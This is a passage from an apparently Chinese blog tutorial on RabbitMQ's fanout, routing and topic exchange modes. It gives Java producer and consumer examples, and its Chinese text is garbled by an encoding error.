<img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/38cde6f2449a444a8caf8e46bc521f01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=huwKW70v0%2F65BwH%2FPWhIigFEohY%3D" alt="&#10;" loading="lazy"/></p>
<ul>
<li>exchange â€“ the name of the exchangeï¼Œäº¤æ¢æœºåç§°</li>
<li>type â€“ the exchange type ï¼Œäº¤æ¢æœºç±»å‹</li>
<li>durable â€“ true if we are declaring a durable exchange (the exchange will survive a server restart)ï¼Œæ˜¯å¦å¯æŒä¹…åŒ–</li>
<li>autoDelete â€“ true if the server should delete the exchange when it is no longer in use ï¼Œæ˜¯å¦è‡ªåŠ¨åˆ é™¤</li>
<li>internal â€“ true if the exchange is internal, i.e. canâ€™t be directly published to by a clientï¼Œæ˜¯å¦å†…éƒ¨ä½¿ç”¨ï¼Œå†…éƒ¨ä½¿ç”¨å®¢æˆ·ç«¯å‘ä¸è¿›å»æ¶ˆæ¯</li>
<li>arguments â€“ other properties (construction arguments) for the exchangeï¼Œå‚æ•°</li>
</ul>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.fanout;

<span class="hljs-keyword">import</span> com.rabbitmq.client.BuiltinExchangeType;
<span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;
<span class="hljs-keyword">import</span> com.rabbitmq.client.Connection;
<span class="hljs-keyword">import</span> com.rabbitmq.client.ConnectionFactory;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException {
        <span class="hljs-comment">//1. åˆ›å»ºè¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.newConnection();

        <span class="hljs-comment">//2. åˆ›å»ºä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//3. å£°æ˜äº¤æ¢æœº</span>
        channel.exchangeDeclare(<span class="hljs-string">"fanout.exchange"</span>, BuiltinExchangeType.FANOUT,<span class="hljs-literal">false</span>);
        <span class="hljs-comment">//4. å£°æ˜é˜Ÿåˆ—</span>
        channel.queueDeclare(<span class="hljs-string">"fanout.queue1"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        channel.queueDeclare(<span class="hljs-string">"fanout.queue2"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        <span class="hljs-comment">//5.äº¤æ¢æœºä¸é˜Ÿåˆ—ç»‘å®š</span>
        channel.queueBind(<span class="hljs-string">"fanout.queue1"</span>,<span class="hljs-string">"fanout.exchange"</span>,<span class="hljs-string">""</span>);
        channel.queueBind(<span class="hljs-string">"fanout.queue2"</span>,<span class="hljs-string">"fanout.exchange"</span>,<span class="hljs-string">""</span>);
        <span class="hljs-comment">//6. ç”Ÿäº§æ¶ˆæ¯</span>
        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
            <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello fanout"</span>+i;
            channel.basicPublish(<span class="hljs-string">"fanout.exchange"</span>,<span class="hljs-string">""</span>,<span class="hljs-literal">null</span>,msg.getBytes());
        }
        System.out.println(<span class="hljs-string">"å‘é€æ¶ˆæ¯æˆåŠŸ"</span>);
        <span class="hljs-comment">//7. é‡Šæ”¾èµ„æº</span>
        channel.close();
        connection.close();
    }
}


AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">1234567891011121314151617181920212223242526272829303132333435363738394041424344</span>
</code></pre>
<h3 data-id="heading-5"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2.2 æ¶ˆè´¹è€…</h3>
<p>ä¸¤ä¸ªæ¶ˆè´¹è€…åˆ†åˆ«æ¶ˆè´¹ä¸¤ä¸ªé˜Ÿåˆ—çš„æ¶ˆæ¯ã€‚</p>
<p>æ¶ˆè´¹è€…ï¼š</p>
<ol>
<li>åˆ›å»ºè¿æ¥</li>
<li>åˆ›å»ºChannel</li>
<li>å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—Queue</li>
<li>æ¶ˆè´¹æ¶ˆæ¯</li>
<li>é‡Šæ”¾èµ„æºã€‚</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.fanout;

<span class="hljs-keyword">import</span> com.rabbitmq.client.*;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer1</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException {
        <span class="hljs-comment">//åˆ›å»ºè¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.newConnection();

        <span class="hljs-comment">//åˆ›å»ºä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span>
        channel.queueDeclare(<span class="hljs-string">"fanout.queue1"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        <span class="hljs-comment">//æ¶ˆè´¹æ¶ˆæ¯</span>
        <span class="hljs-type">DefaultConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConsumer</span>(channel) {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleDelivery</span><span class="hljs-params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="hljs-type">byte</span>[] body)</span> <span class="hljs-keyword">throws</span> IOException {
                System.out.println(<span class="hljs-string">"Consumer1 æ¥æ”¶åˆ°æ¶ˆæ¯: "</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(body));
            }
        };
        channel.basicConsume(<span class="hljs-string">"fanout.queue1"</span>,consumer);

<span class="hljs-comment">/*        //é‡Šæ”¾èµ„æº
        channel.close();
        connection.close();*/</span>

    }
}


AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839</span>
</code></pre>
<p>ç»“æœï¼š<br/>
<img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/80fb456eda2247ab9305dbaaa1bb2625~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=eRL8iQ8WJKt36tT%2Fj6oEUuYR0js%3D" alt="&#10;" loading="lazy"/></p>
<h2 data-id="heading-6"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>ä¸‰ã€Routingï¼ˆ[è·¯ç”±æ¨¡å¼]ï¼‰</h2>
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/2ebe7067210f4c25afbc7ce1df8e2fe9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=VVVbioYQOZBscOPFydg9DU26bPc%3D" alt="&#10;" loading="lazy"/></p>
<p>Routing(è·¯ç”±æ¨¡å¼)ï¼š<br/>
é˜Ÿåˆ—å’Œäº¤æ¢æœºçš„ç»‘å®šï¼Œä¸èƒ½æ˜¯ä»»æ„çš„ç»‘å®šäº†ï¼Œâ½½æ˜¯è¦æŒ‡å®šâ¼€ä¸ªBindingKey (RoutingKeyçš„â¼€ç§)ï¼Œæ¶ˆæ¯çš„å‘é€â½…åœ¨å‘Exchangeå‘é€æ¶ˆæ¯æ—¶ï¼Œä¹Ÿéœ€è¦æŒ‡å®šæ¶ˆæ¯çš„RoutingKeyï¼ŒExchangeä¹Ÿä¸å†æŠŠæ¶ˆæ¯äº¤ç»™æ¯â¼€ä¸ªç»‘å®šçš„keyï¼Œâ½½æ˜¯æ ¹æ®æ¶ˆæ¯çš„RoutingKeyè¿›â¾åˆ¤æ–­ï¼Œåªæœ‰é˜Ÿåˆ—ç»‘å®šæ—¶çš„BindingKeyå’Œå‘é€æ¶ˆæ¯çš„RoutingKey å®Œå…¨â¼€è‡´ï¼Œæ‰ä¼šæ¥æ”¶åˆ°æ¶ˆæ¯ã€‚</p>
<h3 data-id="heading-7"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3.1 ç”Ÿäº§è€…</h3>
<p>ç”Ÿäº§è€…ï¼š</p>
<ol>
<li>åˆ›å»ºè¿æ¥</li>
<li>åˆ›å»ºä¿¡é“</li>
<li>å£°æ˜äº¤æ¢æœºï¼Œç±»å‹ä¸ºdirect</li>
<li>å£°æ˜é˜Ÿåˆ—</li>
<li>é˜Ÿåˆ—ä¸äº¤æ¢æœºç»‘å®šï¼Œç»‘å®šçš„æ—¶å€™åŠ ä¸ŠBindingKeyå‚æ•°</li>
<li>ç”Ÿäº§æ¶ˆæ¯ï¼Œæ¶ˆæ¯å‘é€çš„æ—¶å€™æŒ‡å®šroutingKey</li>
<li>é‡Šæ”¾èµ„æº</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.direct;

<span class="hljs-keyword">import</span> com.rabbitmq.client.BuiltinExchangeType;
<span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;
<span class="hljs-keyword">import</span> com.rabbitmq.client.Connection;
<span class="hljs-keyword">import</span> com.rabbitmq.client.ConnectionFactory;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException {
        <span class="hljs-comment">//1. åˆ›å»ºè¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.newConnection();
        <span class="hljs-comment">//2. åˆ›å»ºä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//3. å£°æ˜äº¤æ¢æœº</span>
        channel.exchangeDeclare(<span class="hljs-string">"direct.exchange"</span>, BuiltinExchangeType.DIRECT,<span class="hljs-literal">true</span>);
        <span class="hljs-comment">//4. å£°æ˜é˜Ÿåˆ—</span>
        channel.queueDeclare(<span class="hljs-string">"direct.queue1"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        channel.queueDeclare(<span class="hljs-string">"direct.queue2"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        <span class="hljs-comment">//5. é˜Ÿåˆ—ä¸äº¤æ¢æœºç»‘å®š</span>
        channel.queueBind(<span class="hljs-string">"direct.queue1"</span>,<span class="hljs-string">"direct.exchange"</span>,<span class="hljs-string">"a"</span>);
        channel.queueBind(<span class="hljs-string">"direct.queue2"</span>,<span class="hljs-string">"direct.exchange"</span>,<span class="hljs-string">"a"</span>);
        channel.queueBind(<span class="hljs-string">"direct.queue2"</span>,<span class="hljs-string">"direct.exchange"</span>,<span class="hljs-string">"b"</span>);
        channel.queueBind(<span class="hljs-string">"direct.queue2"</span>,<span class="hljs-string">"direct.exchange"</span>,<span class="hljs-string">"c"</span>);


        <span class="hljs-comment">//6. ç”Ÿäº§æ¶ˆæ¯</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">msgA</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello direct routingKey is a"</span>;
        channel.basicPublish(<span class="hljs-string">"direct.exchange"</span>,<span class="hljs-string">"a"</span>,<span class="hljs-literal">null</span>,msgA.getBytes());
        <span class="hljs-type">String</span> <span class="hljs-variable">msgB</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello direct routingKey is b"</span>;
        channel.basicPublish(<span class="hljs-string">"direct.exchange"</span>,<span class="hljs-string">"b"</span>,<span class="hljs-literal">null</span>,msgB.getBytes());
        <span class="hljs-type">String</span> <span class="hljs-variable">msgC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello direct routingKey is c"</span>;
        channel.basicPublish(<span class="hljs-string">"direct.exchange"</span>,<span class="hljs-string">"c"</span>,<span class="hljs-literal">null</span>,msgC.getBytes());
        
        System.out.println(<span class="hljs-string">"å‘é€æ¶ˆæ¯æˆåŠŸ"</span>);
        <span class="hljs-comment">//7. é‡Šæ”¾èµ„æº</span>
        channel.close();
        connection.close();
    }
}


AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950</span>
</code></pre>
<h3 data-id="heading-8"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3.2 æ¶ˆè´¹è€…</h3>
<p>ä¸¤ä¸ªæ¶ˆè´¹è€…åˆ†åˆ«æ¶ˆè´¹ä¸¤ä¸ªé˜Ÿåˆ—çš„æ¶ˆæ¯ã€‚</p>
<p>æ¶ˆè´¹è€…ï¼š</p>
<ol>
<li>åˆ›å»ºè¿æ¥</li>
<li>åˆ›å»ºChannel</li>
<li>å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—Queue</li>
<li>æ¶ˆè´¹æ¶ˆæ¯</li>
<li>é‡Šæ”¾èµ„æºã€‚</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.direct;

<span class="hljs-keyword">import</span> com.rabbitmq.client.*;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer1</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException {
        <span class="hljs-comment">//åˆ›å»ºè¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.newConnection();

        <span class="hljs-comment">//åˆ›å»ºä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span>
        channel.queueDeclare(<span class="hljs-string">"direct.queue1"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        <span class="hljs-comment">//æ¶ˆè´¹æ¶ˆæ¯</span>
        <span class="hljs-type">DefaultConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConsumer</span>(channel) {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleDelivery</span><span class="hljs-params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="hljs-type">byte</span>[] body)</span> <span class="hljs-keyword">throws</span> IOException {
                System.out.println(<span class="hljs-string">"Consumer1 æ¥æ”¶åˆ°æ¶ˆæ¯: "</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(body));
            }
        };
        channel.basicConsume(<span class="hljs-string">"direct.queue1"</span>,consumer);

<span class="hljs-comment">/*        //é‡Šæ”¾èµ„æº
        channel.close();
        connection.close();*/</span>

    }
}


AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839</span>
</code></pre>
<p>ç»“æœï¼š<br/>
<img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/1c9ab4eb0cc5481a8180c177b2f9f4f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937423&amp;x-orig-sign=BJBjh2RekzPJ71j4lyZXS5G7X3I%3D" alt="&#10;" loading="lazy"/></p>
<h2 data-id="heading-9"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>å››ã€Topics(é€šé…ç¬¦æ¨¡å¼)</h2>
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/8afa799b03d24a41872340b98377919c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=OxM5IJQys%2BpI%2BhZdFBRwCLHD01I%3D" alt="&#10;" loading="lazy"/></p>
<p>Topics å’Œ Routing æ¨¡å¼çš„åŒºåˆ«æ˜¯ï¼š</p>
<ol>
<li>topics æ¨¡å¼ä½¿â½¤çš„äº¤æ¢æœºç±»å‹ä¸ºtopic(Routingæ¨¡å¼ä½¿â½¤çš„äº¤æ¢æœºç±»å‹ä¸ºdirect)</li>
<li>topic ç±»å‹çš„äº¤æ¢æœºåœ¨åŒ¹é…è§„åˆ™ä¸Šè¿›â¾äº†æ‰©å±•ï¼ŒBinding Keyâ½€æŒé€šé…ç¬¦åŒ¹é…(directç±»å‹çš„äº¤æ¢æœºè·¯ç”±è§„åˆ™æ˜¯BindingKeyå’ŒRoutingKeyå®Œå…¨åŒ¹é…)ã€‚</li>
</ol>
<p>åœ¨topicç±»å‹çš„äº¤æ¢æœºåœ¨åŒ¹é…è§„åˆ™ä¸Šï¼Œæœ‰äº›è¦æ±‚ï¼š</p>
<ol>
<li>RoutingKey æ˜¯â¼€ç³»åˆ—ç”±ç‚¹( . )åˆ†éš”çš„å•è¯ï¼Œâ½å¦‚ " stock.usd.nyse â€œï¼Œâ€ nyse.vmw â€œ,â€ quick.orange.rabbit "</li>
<li>BindingKey å’Œ RoutingKeyâ¼€æ ·ï¼Œä¹Ÿæ˜¯ç‚¹( . )åˆ†å‰²çš„å­—ç¬¦ä¸²ã€‚</li>
<li>Binding Keyä¸­å¯ä»¥å­˜åœ¨ä¸¤ç§ç‰¹æ®Šå­—ç¬¦ä¸²,â½¤äºæ¨¡ç³ŠåŒ¹é…<br/>
3.1Â <code>*</code>Â è¡¨â½°â¼€ä¸ªå•è¯<br/>
3.2Â <code>#</code>Â è¡¨â½°å¤šä¸ªå•è¯(0-Nä¸ª)</li>
</ol>
<h3 data-id="heading-10"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4.1 ç”Ÿäº§è€…</h3>
<p>ç”Ÿäº§è€…ï¼š</p>
<ol>
<li>åˆ›å»ºè¿æ¥</li>
<li>åˆ›å»ºä¿¡é“</li>
<li>å£°æ˜äº¤æ¢æœºï¼Œç±»å‹ä¸ºtopic</li>
<li>å£°æ˜é˜Ÿåˆ—</li>
<li>é˜Ÿåˆ—ä¸äº¤æ¢æœºç»‘å®šï¼Œç»‘å®šçš„æ—¶å€™åŠ ä¸ŠBindingKeyå‚æ•°</li>
<li>ç”Ÿäº§æ¶ˆæ¯ï¼Œæ¶ˆæ¯å‘é€çš„æ—¶å€™æŒ‡å®šroutingKey</li>
<li>é‡Šæ”¾èµ„æº</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.topics;

<span class="hljs-keyword">import</span> com.rabbitmq.client.BuiltinExchangeType;
<span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;
<span class="hljs-keyword">import</span> com.rabbitmq.client.Connection;
<span class="hljs-keyword">import</span> com.rabbitmq.client.ConnectionFactory;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException {
        <span class="hljs-comment">//1. åˆ›å»ºè¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.newConnection();
        <span class="hljs-comment">//2. åˆ›å»ºä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//3. å£°æ˜äº¤æ¢æœº</span>
        channel.exchangeDeclare(<span class="hljs-string">"topic.exchange"</span>, BuiltinExchangeType.TOPIC,<span class="hljs-literal">true</span>);
        <span class="hljs-comment">//4. å£°æ˜é˜Ÿåˆ—</span>
        channel.queueDeclare(<span class="hljs-string">"topic.queue1"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        channel.queueDeclare(<span class="hljs-string">"topic.queue2"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        <span class="hljs-comment">//5. é˜Ÿåˆ—ä¸äº¤æ¢æœºç»‘å®š</span>
        channel.queueBind(<span class="hljs-string">"topic.queue1"</span>,<span class="hljs-string">"topic.exchange"</span>,<span class="hljs-string">"*.a.*"</span>);
        channel.queueBind(<span class="hljs-string">"topic.queue2"</span>,<span class="hljs-string">"topic.exchange"</span>,<span class="hljs-string">"*.*.b"</span>);
        channel.queueBind(<span class="hljs-string">"topic.queue2"</span>,<span class="hljs-string">"topic.exchange"</span>,<span class="hljs-string">"c.#"</span>);


        <span class="hljs-comment">//6. ç”Ÿäº§æ¶ˆæ¯</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">msgA</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello topic routingKey is word.a.word"</span>;
        channel.basicPublish(<span class="hljs-string">"topic.exchange"</span>,<span class="hljs-string">"word.a.word"</span>,<span class="hljs-literal">null</span>,msgA.getBytes());
        <span class="hljs-type">String</span> <span class="hljs-variable">msgB</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello topic routingKey is word.word.b"</span>;
        channel.basicPublish(<span class="hljs-string">"topic.exchange"</span>,<span class="hljs-string">"word.word.b"</span>,<span class="hljs-literal">null</span>,msgB.getBytes());
        <span class="hljs-type">String</span> <span class="hljs-variable">msgC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello topic routingKey is c.word.word.word.word.b"</span>;
